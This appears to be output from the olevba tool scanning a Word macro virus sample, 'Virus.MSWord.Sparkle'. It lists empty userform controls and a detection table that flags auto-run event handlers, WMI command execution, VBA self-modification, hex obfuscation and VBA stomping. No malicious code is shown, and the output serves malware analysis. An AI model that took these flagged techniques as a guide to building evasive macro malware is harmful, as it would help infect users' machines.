VBA FORM Variable "b'CommandButton3'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox2'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox3'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox4'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox2'" IN './Virus.MSWord.Sparkle' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |ListBox2_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |ScrollBar1_Change   |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

